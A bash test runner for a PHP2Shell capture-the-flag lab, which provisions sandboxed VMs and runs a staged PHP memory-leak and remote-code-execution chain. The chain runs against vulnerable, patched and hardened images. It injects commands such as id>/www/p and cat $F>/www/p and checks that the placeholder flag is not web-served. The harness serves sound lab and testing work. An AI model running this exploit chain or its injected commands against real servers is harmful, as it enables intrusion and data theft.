#!/usr/bin/env bash
#
# End-to-end PHP2Shell training-lab run.
#
# Topology (nothing privileged on the host):
#   host  --ssh-->  throwaway vmtest VM  --firecracker-->  lab microVM
#
# The runner boots its OWN vmtest VM (unique VM_DIR and ports, never the
# vmtest defaults), provisions it exactly like vmtest/run.sh, installs the
# shipped agent unit, registers the built images, creates one instance per
# image through the real agent API with a TCP expose, and runs the fetched
# toolkit from INSIDE the VM against an ssh -L forward of the instance's guest
# endpoint. The proof command writes `id` into the webroot and the runner
# fetches it over HTTP; the assertion is uid=33(www-data).
#
# Usage:
#   ./run.sh                 # build (cached) + full VM run
#   P2S_SKIP_BUILD=1 ./run.sh
#   KEEP_VM=1 ./run.sh       # leave the VM for debugging
#   P2S_CHAIN_RETRIES=3 ./run.sh
#
# A transport error, a missing readiness, or an unparseable API response is a
# TEST FAILURE, never a negative result. The two controls are negative by
# design and only pass after the target has been proven reachable and serving
# the expected PHP version.
set -uo pipefail
. "$(dirname -- "$0")/lib.sh"

RUN_ID=$(date +%Y%m%d-%H%M%S)-$$
LOG=$LOGS/run-$RUN_ID.log
VM_DIR=${VM_DIR:-$CACHE/vm-$RUN_ID}
# Allocate every port this run needs in one simultaneous bind so the ports are
# distinct from each other by construction and never the vmtest defaults
# (2422/8201). Ports fixed in the environment are honoured and excluded from
# the draw. See free_tcp_set in lib.sh.
P2S_PORTS=()
for _pv in "${VM_SSH_PORT:-}" "${VM_SEED_PORT:-}" "${FWD_PORT:-}"; do
  [ -n "$_pv" ] && P2S_PORTS+=("$_pv")
done
_p2s_need=0
[ -z "${VM_SSH_PORT:-}" ] && _p2s_need=$((_p2s_need + 1))
[ -z "${VM_SEED_PORT:-}" ] && _p2s_need=$((_p2s_need + 1))
[ -z "${FWD_PORT:-}" ] && _p2s_need=$((_p2s_need + 1))
if [ "$_p2s_need" -gt 0 ]; then
  _p2s_drawn=$(free_tcp_set "$_p2s_need" "${P2S_PORTS[@]}") ||
    die "could not allocate $_p2s_need free TCP ports"
  for _pv in $_p2s_drawn; do
    if [ -z "${VM_SSH_PORT:-}" ]; then
      VM_SSH_PORT=$_pv
    elif [ -z "${VM_SEED_PORT:-}" ]; then
      VM_SEED_PORT=$_pv
    else
      FWD_PORT=$_pv
    fi
  done
fi
unset _pv _p2s_need _p2s_drawn P2S_PORTS
export VM_DIR VM_SSH_PORT VM_SEED_PORT
export VM_MEM=${VM_MEM:-4096} VM_SMP=${VM_SMP:-4} VM_DISK=${VM_DISK:-40G}
TOKEN=${FIRECRACKER_AGENT_TOKEN:-p2s-token-$RUN_ID}
API=http://127.0.0.1:7001
STATE=/var/lib/rctf-firecracker/state
IMAGES_DIR=/var/lib/rctf-firecracker/images
OUTSIDE_IF=p2sout0
OUTSIDE_IP=192.0.2.1
SUBNET_POOL=10.201.0.0/16
TCP_RANGE='{ from: 31000, to: 31100 }'
VMKEY=$VM_DIR/id_ed25519
TUNNEL_PID=
INSTANCES=()

mkdir -p "$LOGS"
exec 3>&1
exec >>"$LOG" 2>&1
say() {
  printf '%s\n' "$*" >&3
  printf '%s\n' "$*" >>"$LOG"
}
fail() {
  say "FAIL: $*"
  exit 1
}
vm_ssh() { "$VMTEST_DIR/vm.sh" ssh "$@"; }
# The agent listens on the VM's loopback, not on the host. Every API call is
# therefore executed inside the VM; only the response body/code is brought
# back to the host.
API_BASE=http://127.0.0.1:7001
api() { # api <path>
  vm_ssh "curl -fsS --max-time 120 -H 'Authorization: Bearer $TOKEN' \
    -H 'Content-Type: application/json' '$API_BASE$1'"
}
api_code() { # api_code <method> <path> [body-file]
  local method=$1 path=$2 body=${3:-}
  if [ -n "$body" ]; then
    vm_ssh "curl -sS --max-time 120 -o /tmp/p2s-api.out -w '%{http_code}' \
      -H 'Authorization: Bearer $TOKEN' -H 'Content-Type: application/json' \
      -X '$method' '$API_BASE$path' --data-binary @-" <"$body"
  else
    vm_ssh "curl -sS --max-time 120 -o /tmp/p2s-api.out -w '%{http_code}' \
      -H 'Authorization: Bearer $TOKEN' -H 'Content-Type: application/json' \
      -X '$method' '$API_BASE$path'"
  fi
}
api_body() { vm_ssh 'cat /tmp/p2s-api.out 2>/dev/null'; }

cleanup() {
  local rc=$?
  if [ -n "$TUNNEL_PID" ]; then
    vm_ssh "kill $TUNNEL_PID" >/dev/null 2>&1 || true
  fi
  for id in "${INSTANCES[@]}"; do
    api_code DELETE "/v1/instances/$id" >/dev/null 2>&1 || true
  done
  if [ "${KEEP_VM:-0}" != 1 ]; then
    say "==> stopping the lab VM"
    "$VMTEST_DIR/vm.sh" stop >/dev/null 2>&1 || true
  else
    say "KEEP_VM=1: VM left running at 127.0.0.1:$VM_SSH_PORT (dir $VM_DIR)"
  fi
  say "transcript: $LOG"
  exit "$rc"
}
trap cleanup EXIT INT TERM

say "PHP2Shell training lab - $RUN_ID"
say "repo: $REPO"
say "vm:   $VM_DIR (ssh $VM_SSH_PORT, seed $VM_SEED_PORT)"
say "log:  $LOG"

command -v qemu-system-x86_64 >/dev/null || die "qemu-system-x86_64 is required"
command -v jq >/dev/null || die "jq is required (host API specs + profile)"
command -v python3 >/dev/null || die "python3 is required (port allocation)"
[ -r /dev/kvm ] && [ -w /dev/kvm ] || die "/dev/kvm must be readable/writable"

# ---------------------------------------------------------------------------
# 0. Calibration profile
# ---------------------------------------------------------------------------
# The leak parameters and the stage-3 geometry are measured values, not
# guesses. They live in a profile file that records the exact image digest and
# the real proof. Without a stage-3 geometry the runner asserts only the
# memory-safety primitives and says so; it never reports a chain it did not
# run. P2S_STAGE1_N / P2S_FORGE_LEN / P2S_STAGE2_T / P2S_STAGE2_V /
# P2S_STAGE3_HTDATA / P2S_STAGE3_PADS override the profile (fail closed when
# only one of the two stage-3 values is supplied).
PROFILE=${P2S_PROFILE:-$LAB_DIR/calibration/php-8.4.26-apache-trixie.json}
P_STAGE1_N=841
P_FORGE_LEN=63
P_STAGE2_T=406
P_STAGE2_V=16
P_HTDATA=
P_PADS=
P_COOKIE=0
P_STAGE3_VERIFIED=0
if [ -f "$PROFILE" ]; then
  jq -e . "$PROFILE" >/dev/null 2>&1 || die "malformed calibration profile: $PROFILE"
  P_STAGE1_N=$(jq -r '.stage1_n // 841' "$PROFILE")
  P_FORGE_LEN=$(jq -r '.stage1_forge_len // 63' "$PROFILE")
  P_STAGE2_T=$(jq -r '.stage2_t // 406' "$PROFILE")
  P_STAGE2_V=$(jq -r '.stage2_v // 16' "$PROFILE")
  P_HTDATA=$(jq -r '.stage3.htdata // empty' "$PROFILE")
  P_PADS=$(jq -r '(.stage3.pads // []) | map("\(.[0]):\(.[1])") | join(",")' "$PROFILE")
  P_COOKIE=$(jq -r 'if .stage3.cookie == true then 1 else 0 end' "$PROFILE")
  P_STAGE3_VERIFIED=$(jq -r 'if (.stage3.verified == true and (.stage3.htdata // "") != "" and ((.stage3.pads // []) | length) > 0) then 1 else 0 end' "$PROFILE")
fi
STAGE1_N=${P2S_STAGE1_N:-$P_STAGE1_N}
FORGE_LEN=${P2S_FORGE_LEN:-$P_FORGE_LEN}
STAGE2_T=${P2S_STAGE2_T:-$P_STAGE2_T}
STAGE2_V=${P2S_STAGE2_V:-$P_STAGE2_V}
STAGE3_HTDATA=${P2S_STAGE3_HTDATA:-$P_HTDATA}
STAGE3_PADS=${P2S_STAGE3_PADS:-$P_PADS}
RCE_ENABLED=0
if [ -n "${P2S_STAGE3_HTDATA:-}" ] || [ -n "${P2S_STAGE3_PADS:-}" ]; then
  # Explicit operator override: enabled only when both halves are present.
  [ -n "$STAGE3_HTDATA" ] && [ -n "$STAGE3_PADS" ] ||
    die "stage 3 needs BOTH P2S_STAGE3_HTDATA and P2S_STAGE3_PADS"
  RCE_ENABLED=1
elif [ "$P_STAGE3_VERIFIED" = 1 ]; then
  RCE_ENABLED=1
fi
STAGE3_ENV="P2S_STAGE3_PADS='$STAGE3_PADS'"
if [ "$P_COOKIE" = 1 ]; then
  STAGE3_ENV="$STAGE3_ENV P2S_STAGE3_COOKIE=1"
fi
say "calibration profile: $PROFILE"
say "  leaks: N=$STAGE1_N forge=$FORGE_LEN T=$STAGE2_T V=$STAGE2_V"
if [ "$RCE_ENABLED" = 1 ]; then
  say "  stage 3: htdata=$STAGE3_HTDATA pads=$STAGE3_PADS (RCE asserted)"
else
  say "  stage 3: NOT CALIBRATED (leak primitives only; RCE not asserted)"
fi

# ---------------------------------------------------------------------------
# 1. Images (host-side, unprivileged)
# ---------------------------------------------------------------------------
if [ "${P2S_SKIP_BUILD:-0}" != 1 ]; then
  if [ "${P2S_GUEST:-official}" = source ]; then
    say "==> building images from source (host, unprivileged)"
    "$LAB_DIR/build.sh" || fail "image build failed"
  else
    say "==> building images from the pinned official OCI image (host, unprivileged)"
    "$LAB_DIR/build-oci.sh" || fail "official-image build failed"
  fi
else
  say "==> P2S_SKIP_BUILD=1: using cached images"
fi
for name in php2shell-vuln php2shell-patched php2shell-hardened; do
  [ -f "$IMAGES/$name/rootfs.ext4" ] && [ -f "$IMAGES/$name/vmlinux" ] &&
    [ -f "$IMAGES/$name/offsets.env" ] || fail "missing image $name (run build-oci.sh)"
  if [ "${P2S_GUEST:-official}" != source ]; then
    grep -qx 'APACHE=official-image' "$IMAGES/$name/meta.env" 2>/dev/null ||
      fail "image $name is not an official-image guest (rebuild with build-oci.sh --force)"
  fi
done

# ---------------------------------------------------------------------------
# 2. Boot + provision the throwaway VM (vmtest CLI, unchanged)
# ---------------------------------------------------------------------------
say "==> booting the vmtest VM"
"$VMTEST_DIR/vm.sh" create || fail "VM boot failed"
"$VMTEST_DIR/vm.sh" status || fail "VM is not running"

say "==> copying the checkout and shared artifacts into the VM"
if [ "${P2S_SKIP_PROVISION:-0}" = 1 ]; then
  say "==> P2S_SKIP_PROVISION=1: reusing the provisioned VM"
else
WORK_TMP=$(mktemp -d "${TMPDIR:-/tmp}/p2s-run.XXXXXX")
tar czf "$WORK_TMP/repo.tgz" -C "$REPO" --exclude=.git --exclude=node_modules .
vm_ssh 'rm -rf /tmp/p2s-repo && mkdir -p /tmp/p2s-repo && tar xzf - -C /tmp/p2s-repo' \
  <"$WORK_TMP/repo.tgz" || fail "checkout copy failed"

STAGE=$WORK_TMP/artifacts
mkdir -p "$STAGE"
# Shared cache lock while snapshotting: a concurrent fetch-artifacts.sh run
# holds this lock exclusively and rebuilds fc-extract/rootdir in place.
: >>"$SMOKE_ARTIFACTS/.fetch.lock"
(
  flock -s 9
  cp "$SMOKE_ARTIFACTS/firecracker" "$STAGE/firecracker"
  cp "$SMOKE_ARTIFACTS/dl/fc-extract/release-v1.17.0-x86_64/jailer-v1.17.0-x86_64" "$STAGE/jailer"
  cp -a "$SMOKE_ARTIFACTS/dl/rootdir" "$STAGE/rootdir"
  cp "$SMOKE_ARTIFACTS/dl/jq" "$STAGE/jq"
) 9<"$SMOKE_ARTIFACTS/.fetch.lock" || fail "artifact staging failed"
chmod 0755 "$STAGE/firecracker" "$STAGE/jailer" "$STAGE/jq"
tar czf "$WORK_TMP/artifacts.tgz" -C "$STAGE" .
vm_ssh 'rm -rf /tmp/fc-vmtest/artifacts && mkdir -p /tmp/fc-vmtest/artifacts && tar xzf - -C /tmp/fc-vmtest/artifacts' \
  <"$WORK_TMP/artifacts.tgz" || fail "artifact copy failed"
rm -rf "$WORK_TMP"

say "==> provisioning the VM (packages, bun, checkout)"
vm_ssh 'sudo REPO_SRC=/tmp/p2s-repo bash /tmp/p2s-repo/deploy/firecracker/vmtest/provision.sh' ||
  fail "provisioning failed"

say "==> installing host prerequisites and the shipped agent unit"
vm_ssh 'sudo bash /opt/rctf-firecracker/deploy/firecracker/host/host-setup.sh' ||
  fail "host-setup failed"
fi

say "==> installing the ssh client in the VM (needed for the ssh -L forward)"
vm_ssh 'sudo apt-get install -y -q --no-install-recommends openssh-client >/dev/null' ||
  fail "could not install openssh-client in the VM"

say "==> creating the lab external interface $OUTSIDE_IF ($OUTSIDE_IP/24)"
vm_ssh "sudo ip link del $OUTSIDE_IF 2>/dev/null || true
  sudo ip link add $OUTSIDE_IF type dummy
  sudo ip addr add $OUTSIDE_IP/24 dev $OUTSIDE_IF
  sudo ip link set $OUTSIDE_IF up" || fail "could not create $OUTSIDE_IF"

say "==> writing the agent configuration and starting the shipped unit"
AGENT_TMP=$(mktemp -d "${TMPDIR:-/tmp}/p2s-agent.XXXXXX")
AGENT_YAML=$AGENT_TMP/agent.yaml
AGENT_ENV=$AGENT_TMP/agent.env
cat >"$AGENT_YAML" <<YAML
hostId: p2slab
listen: { host: 127.0.0.1, port: 7001 }
stateDir: $STATE
capacity: { vcpus: 4, memMiB: 4096, diskMiB: 8192, maxInstances: 8 }
expiryGraceSeconds: 600
vm:
  mode: jailer
  firecrackerBin: /usr/local/bin/firecracker
  jailerBin: /usr/local/bin/jailer
  imagesDir: $IMAGES_DIR
  runDir: /var/lib/rctf-firecracker/run
  chrootBase: /srv/jailer
  jailUid: 10000
  jailGid: 10000
  cgroupLimits: ['pids.max=512']
network:
  publicHost: $OUTSIDE_IP
  httpDomain: p2s.test
  httpPort: 80
  httpsPort: 443
  tcpSslPort: 443
  tcpPortRange: $TCP_RANGE
  subnetPool: $SUBNET_POOL
  traefikDynamicDir: /etc/traefik/dynamic/rctf-firecracker
  externalInterface: $OUTSIDE_IF
  reuseQuarantineSeconds: 120
  requireConntrack: true
  tapUser: '10000'
  tapGroup: '10000'
YAML
printf 'FIRECRACKER_AGENT_TOKEN=%s\n' "$TOKEN" >"$AGENT_ENV"
vm_ssh "sudo install -m 0644 /opt/rctf-firecracker/deploy/firecracker/host/rctf-firecracker-agent.service /etc/systemd/system/rctf-firecracker-agent.service
  sudo mkdir -p /etc/rctf-firecracker
  sudo tee /etc/rctf-firecracker/agent.yaml >/dev/null" <"$AGENT_YAML" ||
  fail "could not install the agent configuration"
vm_ssh "sudo tee /etc/rctf-firecracker/agent.env >/dev/null" <"$AGENT_ENV" ||
  fail "could not install the agent token"
rm -f "$AGENT_YAML" "$AGENT_ENV"
rmdir "$AGENT_TMP" 2>/dev/null || rm -rf "$AGENT_TMP"
vm_ssh "sudo chmod 0600 /etc/rctf-firecracker/agent.env
  sudo systemctl daemon-reload
  sudo systemctl enable rctf-firecracker-agent >/dev/null 2>&1
  sudo systemctl restart rctf-firecracker-agent" ||
  fail "could not start the agent"

for _ in $(seq 1 60); do
  accepting=$(api "/v1/info" 2>/dev/null | jq -r '.accepting // false' 2>/dev/null) || accepting=false
  [ "$accepting" = true ] && break
  sleep 2
done
[ "${accepting:-false}" = true ] || {
  vm_ssh 'sudo journalctl -u rctf-firecracker-agent --no-pager -n 60' >&2 || true
  fail "agent did not report accepting:true"
}
say "agent accepting (jailer mode)"

# ---------------------------------------------------------------------------
# 3. Stage the images into the agent's imagesDir
# ---------------------------------------------------------------------------
say "==> staging the images into the agent's imagesDir"
IMG_TMP=$(mktemp -d "${TMPDIR:-/tmp}/p2s-images.XXXXXX")
for name in php2shell-vuln php2shell-patched php2shell-hardened; do
  say "==> staging image $name"
  tar czf "$IMG_TMP/$name.tgz" -C "$IMAGES/$name" .
  vm_ssh "sudo rm -rf $IMAGES_DIR/$name && sudo mkdir -p $IMAGES_DIR/$name &&
    sudo tar xzf - -C $IMAGES_DIR/$name &&
    sudo chown -R root:root $IMAGES_DIR/$name &&
    sudo chmod 0755 $IMAGES_DIR/$name &&
    sudo chmod 0644 $IMAGES_DIR/$name/vmlinux $IMAGES_DIR/$name/rootfs.ext4" \
    <"$IMG_TMP/$name.tgz" || fail "could not stage image $name"
  rm -f "$IMG_TMP/$name.tgz"
done
rm -rf "$IMG_TMP"

api "/v1/info" | jq -c '.images' | grep -q 'php2shell-vuln' ||
  fail "the agent does not list the staged images"

# ---------------------------------------------------------------------------
# 4. Instance + readiness + tunnel
# ---------------------------------------------------------------------------
# The lab's placeholder flag (never a real secret): it is handed to the
# instance through the agent API, reaches the guest over MMDS only, and is
# published by /app/start to /run/flag.txt -- tmpfs, OUTSIDE the Apache
# DocumentRoot. The runner proves the challenge objective end to end:
# the flag is NOT web-served (assert_flag_http_absent) and IS readable
# through the RCE (assert_chain_flag_read, `cat $F>/www/p`).
FLAG='rctf{php2shell-lab-not-a-real-flag}'
# The recon record's documented non-flag sentinel: /app/start writes it to
# /run/m364-intake.txt on recon-named instances and exports F pointing at
# it, so the "RCE finds no flag" negative is positively verifiable (an
# empty proof would be indistinguishable from a probabilistic stage-3
# miss). Byte-matched against lab/app-start-oci and lab/app-start.
RECON_INTAKE_NOTE='M364 intake note: the credit reference for this incident is filed with the post-incident review.'
# The unlinked static incident note: the fc-m364-recon record's
# enumeration spot (the incident id is visible in the portal banner).
INCIDENT_NOTE_URL=incidents/EX2611-0442.html

make_spec() { # make_spec <file> <id> <image> [provider] [challenge]
  local file=$1 id=$2 image=$3 provider=${4:-main} challenge=${5:-fc-m364-credit}
  # The flag provider name: the lab default is "main"; the platform path
  # passes the challenge's registered provider ("flags/static") through
  # verbatim, and the guest init sanitises it to "flags_static" -- which
  # app-start resolves. The CHALLENGE env is the per-record placement
  # switch the guest /app/start reads (fc-m364-credit -> /run/flag.txt;
  # fc-m364-recon -> the static incident note + non-flag sentinel). See
  # sections 5b/5c of this runner.
  jq -n \
    --arg id "$id" --arg image "$image" --arg flag "$FLAG" \
    --arg provider "$provider" --arg challenge "$challenge" \
    --argjson expires "$((($(date +%s) + 3600) * 1000))" '
    {
      id: $id, teamKey: "0123456789ab", image: $image,
      vcpus: 1, memMiB: 256, diskMiB: 1024, egress: false,
      bootTimeoutSeconds: 180,
      readiness: {kind: "tcp", port: 8080},
      env: {CHALLENGE: $challenge},
      expose: [{kind: "tcp", hostPrefix: "web", port: 8080}],
      expiresAtMs: $expires,
      flags: [{provider: $provider, flag: $flag}]
    }' >"$file"
}

start_instance() { # start_instance <image> <suffix> [provider] [challenge]; prints id
  local image=$1 suffix=$2 provider=${3:-main} challenge=${4:-fc-m364-credit} id spec code
  id="p2s${RUN_ID//[^a-z0-9]/}${suffix}"
  id=${id:0:62}
  spec=$(mktemp "${TMPDIR:-/tmp}/p2s-spec.XXXXXX")
  make_spec "$spec" "$id" "$image" "$provider" "$challenge"
  code=$(api_code PUT "/v1/instances/$id" "$spec")
  rm -f "$spec"
  case "$code" in
    200 | 201) ;;
    *) fail "create $id ($image) returned HTTP $code: $(api_body | head -c 400)" ;;
  esac
  INSTANCES+=("$id")
  for _ in $(seq 1 180); do
    st=$(api "/v1/instances/$id" 2>/dev/null | jq -r '.state // "missing"' 2>/dev/null) || st=missing
    case "$st" in
      running) printf '%s\n' "$id"; return 0 ;;
      errored | failed) fail "instance $id entered state $st" ;;
    esac
    sleep 1
  done
  fail "instance $id did not reach running"
}

guest_ip() { # guest_ip <id>
  vm_ssh "sudo jq -r '.lease.guestIp // empty' $STATE/$1.json" ||
    fail "could not read the guest IP for $1"
}

start_tunnel() { # start_tunnel <guestIp>; sets TUNNEL_PID
  local gip=$1
  vm_ssh 'cat > /tmp/p2s-key && chmod 600 /tmp/p2s-key' <"$VMKEY" ||
    fail "could not stage the ssh key"
  # Kill the previous tunnel by its recorded PID. Do NOT use `pkill -f` here:
  # the pattern would also match this very ssh command line (the remote command
  # is part of the outer ssh client's argv) and kill the session before the
  # forward is created.
  vm_ssh "if [ -f /tmp/p2s-tunnel.pid ]; then sudo kill \$(cat /tmp/p2s-tunnel.pid) 2>/dev/null || true; rm -f /tmp/p2s-tunnel.pid; fi
    nohup ssh -N -i /tmp/p2s-key -p 22 \
      -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \
      -o ExitOnForwardFailure=yes -o ServerAliveInterval=10 \
      -L 127.0.0.1:$FWD_PORT:$gip:8080 ubuntu@10.0.2.15 \
      >/tmp/p2s-tunnel.log 2>&1 & echo \$! >/tmp/p2s-tunnel.pid"
  TUNNEL_PID=$(vm_ssh 'cat /tmp/p2s-tunnel.pid') || fail "tunnel did not start"
  for _ in $(seq 1 40); do
    # Probe /version.php, not /index.php: the chain's landing page must not be
    # touched by anything except the chain itself.
    if vm_ssh "curl -fsS --max-time 2 -o /dev/null http://127.0.0.1:$FWD_PORT/version.php" 2>/dev/null; then
      return 0
    fi
    sleep 0.5
  done
  vm_ssh 'cat /tmp/p2s-tunnel.log' >&2 || true
  fail "ssh -L tunnel to $gip:8080 did not become ready"
}

target_info() { # target_info: PHP version and memory_limit from /version.php
  vm_ssh "curl -fsS --max-time 10 http://127.0.0.1:$FWD_PORT/version.php"
}

assert_target() { # assert_target <php-version> <memory-limit> <label>
  local want_ver=$1 want_lim=$2 label=$3 info ver lim
  info=$(target_info) || fail "$label: /version.php is unreachable"
  ver=$(printf '%s\n' "$info" | sed -n 's/^PHP //p' | head -1)
  lim=$(printf '%s\n' "$info" | sed -n 's/^MEMORY_LIMIT //p' | head -1)
  [ "$ver" = "$want_ver" ] || fail "$label serves PHP '$ver', expected $want_ver"
  [ "$lim" = "$want_lim" ] || fail "$label has memory_limit '$lim', expected $want_lim"
  say "target serves PHP $ver, memory_limit=$lim"
}

# The visible theme is served by Apache as a STATIC file and must be
# byte-identical to the repository's lab/www/index.html on EVERY image: the
# three images differ only in PHP version / memory_limit, never in visible
# content, so the controls stay true negative controls of the same themed app.
# The page must also keep its multipart credit form pointed at the inert
# /index.php -- the exact URL the chain POSTs its crafted multipart to. The
# theme itself is pure static content (no PHP execution), so this GET is
# session-neutral and cannot disturb the warmed-state leak methodology (the
# runner primes before every leak/chain assertion regardless).
assert_theme() { # assert_theme <label>
  local label=$1 want got
  want=$(sha256_of "$LAB_DIR/lab/www/index.html")
  got=$(vm_ssh "curl -fsS --max-time 10 -o /tmp/p2s-theme.html \
    http://127.0.0.1:$FWD_PORT/ && sha256sum /tmp/p2s-theme.html | cut -d' ' -f1") ||
    fail "$label: the themed landing page is not reachable at /"
  [ "$got" = "$want" ] ||
    fail "$label: GET / does not serve lab/www/index.html byte-for-byte (sha256 $got, expected $want)"
  vm_ssh "grep -q 'action=\"/index.php\"' /tmp/p2s-theme.html" ||
    fail "$label: the themed page lost its multipart form target"
  say "PASS: $label serves the themed static landing page at / (byte-identical to lab/www/index.html)"
}

# The deployed objective depends on the flag NOT being web-served: /app/start
# publishes it to /run/flag.txt (tmpfs, OUTSIDE the /www DocumentRoot), so a
# plain GET must answer 404 and must never contain the flag bytes. A flag
# inside /www would be served verbatim at /flag.txt over plain HTTP and make
# the event challenge trivially solvable (regression check for the old
# /www/flag.txt placement). Both URL shapes are probed: /flag.txt (the old
# DocumentRoot placement) and /www/flag.txt (which could only resolve if a
# /www/www directory or alias ever appeared).
assert_flag_http_absent() { # assert_flag_http_absent <label> <url-path>
  local label=$1 upath=$2 code body
  code=$(vm_ssh "curl -s --max-time 10 -o /tmp/p2s-flagprobe -w '%{http_code}' \
    http://127.0.0.1:$FWD_PORT/$upath") ||
    fail "$label: could not probe /$upath over the forward"
  [ "$code" -eq 404 ] ||
    fail "$label: /$upath answered HTTP $code (expected 404: the flag must never be web-served)"
  body=$(vm_ssh 'cat /tmp/p2s-flagprobe 2>/dev/null') || body=
  case "$body" in
    *"$FLAG"*) fail "$label: the per-run flag was served over plain HTTP at /$upath" ;;
  esac
  say "PASS: $label: /$upath answers 404 and never serves the flag"
}

# The unlinked static incident note is the fc-m364-recon record's
# enumeration spot (/incidents/EX2611-0442.html; the incident id is
# visible in the portal banner). On CREDIT-named instances it must stay
# the shipped non-flag page -- the flag lives only at /run/flag.txt there.
assert_incident_note_clean() { # assert_incident_note_clean <label>
  local label=$1 code body
  code=$(vm_ssh "curl -s --max-time 10 -o /tmp/p2s-incident.html -w '%{http_code}' \
    http://127.0.0.1:$FWD_PORT/$INCIDENT_NOTE_URL") ||
    fail "$label: could not fetch the incident note"
  [ "$code" -eq 200 ] ||
    fail "$label: the incident note answered HTTP $code (expected the shipped static page)"
  body=$(vm_ssh 'cat /tmp/p2s-incident.html 2>/dev/null') || body=
  case "$body" in
    *"$FLAG"*) fail "$label: the incident note carries the per-run flag (credit placement is broken)" ;;
  esac
  say "PASS: $label: the incident note is the shipped non-flag page"
}

# On RECON-named instances the delivered flag is published ONLY into that
# static note (rewritten at boot by /app/start; the shipped image carries
# no flag), and it must be exactly the per-run MMDS value.
assert_incident_flag() { # assert_incident_flag <label>
  local label=$1 code body
  code=$(vm_ssh "curl -s --max-time 10 -o /tmp/p2s-incident.html -w '%{http_code}' \
    http://127.0.0.1:$FWD_PORT/$INCIDENT_NOTE_URL") ||
    fail "$label: could not fetch the incident note"
  [ "$code" -eq 200 ] ||
    fail "$label: the incident note answered HTTP $code (recon placement is broken)"
  body=$(vm_ssh 'cat /tmp/p2s-incident.html 2>/dev/null') || body=
  printf '%s' "$body" | grep -Fq "$FLAG" ||
    fail "$label: the incident note does not contain the per-run flag (recon placement is broken)"
  say "PASS: $label: the incident note carries the per-run flag (recon placement)"
}

stage_toolkit() {
  local tgz
  if [ ! -d "$TOOLKIT" ] || [ ! -f "$UPSTREAM_LEGACY/exploit.py" ]; then
    "$LAB_DIR/fetch.sh" --toolkit-only || fail "could not fetch the pinned toolkit"
  fi
  tgz=$(mktemp "${TMPDIR:-/tmp}/p2s-toolkit.XXXXXX.tgz")
  tar czf "$tgz" -C "$CACHE" toolkit upstream-legacy
  vm_ssh 'rm -rf /tmp/p2s && mkdir -p /tmp/p2s && tar xzf - -C /tmp/p2s' <"$tgz" ||
    fail "could not stage the toolkit"
  rm -f "$tgz"
  vm_ssh 'mkdir -p /tmp/p2s/lab' || fail "could not create the helper directory"
  vm_ssh 'cat > /tmp/p2s/lab/leaks.py' <"$LAB_DIR/leaks.py" ||
    fail "could not stage the leak helper"
  vm_ssh 'cat > /tmp/p2s/lab/chain.py' <"$LAB_DIR/chain.py" ||
    fail "could not stage the chain helper"
  vm_ssh 'cat > /tmp/p2s/lab/amd64.py' <"$LAB_DIR/amd64.py" ||
    fail "could not stage the amd64 pointer-filter patch"
}

# Prime the leak machinery: the stage-1/2 forges read the session/upload-
# progress structures left stale by a PREVIOUS session-carrying request. A
# fresh guest that has only served session-neutral GETs (/version.php) has
# none, so every forge returns an empty cookie (measured: the same instance
# missed 3x cold and leaked on the first attempt after ONE priming POST).
# This is part of the lab's methodology — the toolkit's calibrator assumes a
# warmed target — not an attack helper: the patched control's session
# machinery works the same way and still produces no stale-pointer leak.
prime_target() { # prime_target <label>
  local label=${1:-target}
  vm_ssh "curl -s -o /dev/null --max-time 10 \
    -F PHPSESSID=aaaaaaaaaaaaaaaaaaa \
    -F PHP_SESSION_UPLOAD_PROGRESS=xx \
    -F 'f=@/etc/hostname;filename=prime.bin' \
    http://127.0.0.1:$FWD_PORT/index.php" ||
    fail "$label: the priming POST failed (target or forward broken)"
}

# LEAK_OUT/LEAK_RC are set by run_leaks; its output is also printed so the
# transcript records the exact stage-1/stage-2 results.
run_leaks() { # run_leaks <image>
  local image=$1 zif dtor
  read_offsets "$IMAGES/$image" || fail "no usable offsets for $image"
  zif=$ZIF_OFFSET
  dtor=$DTOR_OFFSET  LEAK_OUT=$(vm_ssh "timeout 300 python3 /tmp/p2s/lab/leaks.py \
    -u http://127.0.0.1:$FWD_PORT/index.php \
    --toolkit /tmp/p2s/toolkit --repo-dir /tmp/p2s/upstream-legacy \
    --zif-offset $zif --dtor-offset $dtor \
    --stage1-n $STAGE1_N --stage1-len $FORGE_LEN \
    --stage2-t $STAGE2_T --stage2-v $STAGE2_V \
    --retries ${P2S_LEAK_RETRIES:-5} \
    --command 'id>/tmp/p2s-leak'")
  LEAK_RC=$?
  printf '%s\n' "$LEAK_OUT"
}

assert_leaks_present() { # <image> <label>
  prime_target "$2 leak"
  run_leaks "$1"
  [ "$LEAK_RC" -eq 0 ] ||
    fail "$2: the stage-1/2 leaks did not both reproduce (rc=$LEAK_RC)"
  printf '%s' "$LEAK_OUT" | grep -q '^LEAK_RESULT=both$' ||
    fail "$2: leak helper did not report both primitives"
  say "PASS: $2 reproduces the stage-1 stale-id OOM leak and the stage-2 libphp leak"
}

assert_leaks_absent() { # <image> <label>
  prime_target "$2 negative"
  run_leaks "$1"
  case "$LEAK_RC" in
    2) ;;
    3) fail "$2: leak probe hit a transport/setup error (not a negative result)" ;;
    *) fail "$2: a leak primitive reproduced (rc=$LEAK_RC); the control is not real" ;;
  esac
  printf '%s' "$LEAK_OUT" | grep -q '^LEAK_RESULT=absent$' ||
    fail "$2: leak helper did not report an absent result"
  say "PASS: $2: both leak primitives are absent"
}

run_chain() { # run_chain <image> [huge-mb] [command]; prints the chain transcript
  local image=$1 huge=${2:-12} cmd=${3:-id>/www/p} zif dtor
  read_offsets "$IMAGES/$image" || fail "no usable offsets for $image"
  zif=$ZIF_OFFSET
  dtor=$DTOR_OFFSET
  # The parameters are the measured profile values (or explicit env
  # overrides). chain.py forwards --htdata-offset, which the toolkit launcher
  # does not expose, and disables docker offset auto-detection. Stage 3 uses
  # the toolkit's carrier branch for the official image. The command defaults
  # to the calibrated proof payload; the flag-read assertion passes its own.
  vm_ssh "P2S_STAGE1_N=$STAGE1_N P2S_FORGE_LEN=$FORGE_LEN \
    P2S_STAGE2_T=$STAGE2_T P2S_STAGE2_V=$STAGE2_V $STAGE3_ENV \
    timeout 900 python3 /tmp/p2s/lab/chain.py \
      -u http://127.0.0.1:$FWD_PORT/index.php \
      --toolkit /tmp/p2s/toolkit --repo-dir /tmp/p2s/upstream-legacy \
      --zif-offset $zif --dtor-offset $dtor \
      --htdata-offset ${STAGE3_HTDATA:-0x690d8} \
      --profile bookworm --command '$cmd' --fetch /p \
      --retries ${P2S_CHAIN_LEAK_RETRIES:-3} --huge-mb $huge"
}

proof_body() {
  vm_ssh "curl -fsS --max-time 10 http://127.0.0.1:$FWD_PORT/p"
}

